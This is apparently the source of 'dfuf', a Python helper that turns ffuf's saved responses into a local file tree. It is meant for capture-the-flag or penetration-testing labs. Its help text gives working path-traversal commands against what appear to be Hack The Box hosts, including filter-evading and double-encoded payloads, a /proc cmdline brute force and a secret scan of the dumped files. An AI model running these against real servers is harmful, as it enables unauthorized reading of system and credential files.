"""
This script will extract files from ffuf's `-od` and `-o` flags.
"""
import argparse
import json
import sys
import urllib.parse
from pathlib import Path


BASE_DIR = Path(__file__).resolve().parent
HELP_TEXT = '''
Usage:
    1. Dump files with ffuf
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 -od ffuf -o ffuf.json

    2. Extract files from ffuf output
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

Examples:
    1. Common linux files (880 lines) (~8 sec)
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

    2. Common files under `/etc` (8314 lines) (~1 min)
        $ ffuf -c -u 'http://snoopy.htb/download?file=....//....//....//..../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump
        $ tartufo scan-folder ffuf_dump/

    3. Brute force cmdline in `/proc` (~1 min)
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump
        
        View the result in a pretty format :
        $ find ffuf_dump/proc -type f -exec bash -c 'pid=$(echo $0 | cut -d '/' -f3); echo -en "\\n$pid | "; cat $0 | tr "\\0" " "' {} \; | sort -s -n -k 1,1

    4. Files in web root
        $ feroxbuster -t 150 -o ferox_443.txt -k -u https://broscience.htb/
        $ ffuf -c -u 'https://broscience.htb/includes/img.php?path=..%252fFUZZ' -w <(cat ferox_443.txt | awk '{print $6}' | unfurl -u paths | grep '.php$') -enc 'FUZZ:urlencode' -o ffuf.json -od ffuf
        $ dfuf -o ffuf.json -od ffuf ffuf_dump
        '''


def init_parser() -> argparse.Namespace:
    """Parse arguments"""
    parser = argparse.ArgumentParser(
        description="A tool to extract files from ffuf output\n\nhttps://github.com/opabravo/dfuf",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=HELP_TEXT,
    )
    parser.add_argument(
        "-o",
        "--ffuf-json-output",
        help="Json output file from ffuf",
        required=True,
    )
    parser.add_argument(
        "-od",
        "--ffuf-output-dir",
        help="Output directory from ffuf",
        required=True,
    )
    parser.add_argument(
        "dir_to_save_extracted_files",
        help="Output directory where extracted files will be saved",
        default="ffuf_dump",
    )
    return parser


def get_mappings(file_path: str) -> dict:
    """Get FUZZ keyword and result file from ffuf's json output"""
    with open(file_path, "r") as f:
        data = json.load(f)

    return {item["input"]["FUZZ"]: item["resultfile"] for item in data["results"]}


def extract_response_body(ffuf_output: str) -> str:
    response = ffuf_output.split(b"Request ---- Response \xe2\x86\x93 ----\n\n", 1)[1]
    return response.split(b"\r\n\r\n", 1)[1]


def extract_files(
    ffuf_mappings: dict, ffuf_output_dir: str, extracted_files_dir: Path
) -> None:
    """Extract files from ffuf output"""
    for fuzz, resultfile in ffuf_mappings.items():
        result_fp = Path(ffuf_output_dir) / resultfile
        # print(f"Resultfile : {result_fp}")
        with open(result_fp, "rb") as f:
            content = f.read()

        response_body = extract_response_body(content)
        # Recursively decode fuzzing string
        file_path = recursive_url_decode(fuzz)
        # Sanitize file path, prevent directory traversal
        file_path = file_path.replace("..", "").strip()
        output_fp = Path(f"{extracted_files_dir}/{file_path}")
        if not output_fp.parent.exists():
            output_fp.parent.mkdir(parents=True)
        with open(output_fp, "wb") as f:
            f.write(response_body)
        # print(f"Extracted file : {output_fp}")
    print(f"[+] Done! Extracted files saved to {Path(extracted_files_dir).resolve()}")

def recursive_url_decode(url:str):
    decoded = urllib.parse.unquote_plus(url)
    return decoded if decoded == url else recursive_url_decode(decoded)

def main():
    parser = init_parser()
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    extracted_files_dir = Path(args.dir_to_save_extracted_files)
    if not extracted_files_dir.exists():
        extracted_files_dir.mkdir()
    ffuf_output_json = args.ffuf_json_output
    ffuf_output_dir = args.ffuf_output_dir

    ffuf_mappings = get_mappings(ffuf_output_json)
    extract_files(ffuf_mappings, ffuf_output_dir, extracted_files_dir)


if __name__ == "__main__":
    main()
